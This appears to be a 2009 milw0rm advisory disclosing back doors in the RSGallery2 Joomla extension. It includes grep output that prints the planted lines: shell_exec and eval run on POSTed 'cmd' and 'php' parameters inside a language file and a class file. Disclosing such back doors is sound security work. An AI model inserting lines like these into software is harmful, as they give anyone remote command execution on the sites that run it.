@@ -1,0 +1,70 @@
+Vulnerability:
+	Remote code execution back door(s)
+
+Software:
+	RSGallery2 - Gallery Extension for Joomla!
+	We are currently working on a new website. All files are still available at 
+	the JoomlaCode project page.
+
+Severity:
+	Not a big deal.  Joomla components contain all sorts of obfuscated junk all 
+	the time.  Who cares what it does?
+
+URLs:
+http://rsgallery2.net/
+http://joomlacode.org/gf/download/frsrelease/6756/38088/com_rsgallery2_legacy_1.14.3.zip
+http://joomlacode.org/gf/download/frsrelease/7791/36662/com_rsgallery2_2.0.0b1.zip
+
+Joomlacode.org says, about these releases:
+	RSGallery2 1.14.3 Security Release
+	Jonah Braun
+	2008-02-13
+	This is an updated production alpha containing a low threat security fix. If 
+	you use commenting you should upgrade. An option to show/hide the Search box 	
+	has also been added. See the official site for downloads and support: 
+	http://rsgallery2.net/
+
+	RSGallery2 2.0.0b1 released
+	John Caprez
+	2008-06-23
+	This is the first version of RSGallery2 that runs in Joomla 1.5 native mode.
+ 
+	Special thanks goes to all the translators providing the updated language 
+	files and the testers of the nightly builds.
+ 	Download it and enjoy. Feel free to report any bugs or problems in the forum 
+	at the RSGallery2 main web site 
+
+Vendor notified:
+  I tried.  Not very hard though.  joomlacode doesn't seem to have a security 
+  contact and links to joomla.org as if they are the same crowd.  I'm sending 
+  a BCC to the given address for Jonah Braun though.  I'll send it to bugtraq, 
+  and they will sit on it for a few hours.
+  http://developer.joomla.org/security.html
+      Huh?  Do I need more coffee, or does this page say to contact them using 
+      the details at this page?  So you do that, and it says ... no wait, 
+      infloop.  Oh wait, there is a contact form.  Filled something in.  Blah.
+
+Vulnerability:
+
+% wget \
+http://joomlacode.org/gf/download/frsrelease/6756/38088/com_rsgallery2_legacy_1.14.3.zip
+
+% unzip com_rsgallery2_legacy_1.14.3.zip
+
+% egrep -r '(eval|exec).*POST' .
+
+./language/english-utf8.php:                $result = 
+shell_exec($_POST['cmd'] . " 2>&1 ; pwd");
+./language/english-utf8.php:            $result = shell_exec($_POST['cmd'] . " 
+2>&1");
+./includes/rsgallery.class.php:$out = execute($_POST['cmd']);
+./includes/rsgallery.class.php:eval($_POST['php']);
+./includes/rsgallery.class.php:$out = execute($_POST['alias']);
+
+There's other fun obfuscated javascript hiding in 'eval's'.
+
+Ditto version 2
+
+nuf sed  &:-)
+
+# milw0rm.com [2009-05-26]
